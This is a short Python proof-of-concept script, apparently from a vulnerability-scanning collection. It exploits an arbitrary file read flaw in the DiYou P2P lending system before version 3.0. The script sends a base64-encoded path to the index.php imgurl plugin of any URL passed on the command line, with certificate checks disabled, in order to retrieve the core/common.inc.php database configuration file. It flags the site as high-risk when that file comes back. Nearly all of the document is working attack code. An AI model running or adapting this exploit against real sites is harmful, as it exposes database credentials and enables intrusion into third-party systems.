#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 帝友P2P借贷系统任意文件读取漏洞
referer: http://www.wooyun.org/bugs/wooyun-2013-033114
author: Lucifer
description: 帝友P2P3.0以前存在任意文件读取漏洞，可读取数据库配置文件
'''
import sys
import requests
import warnings
from termcolor import cprint

class dyp2p_url_fileread_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = "/index.php?plugins&q=imgurl&url=QGltZ3VybEAvY29yZS9jb21tb24uaW5jLnBocA=="
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"common.inc.php" in req.text:
                cprint("[+]存在帝友P2P借贷系统任意文件读取漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = dyp2p_url_fileread_BaseVerify(sys.argv[1])
    testVuln.run()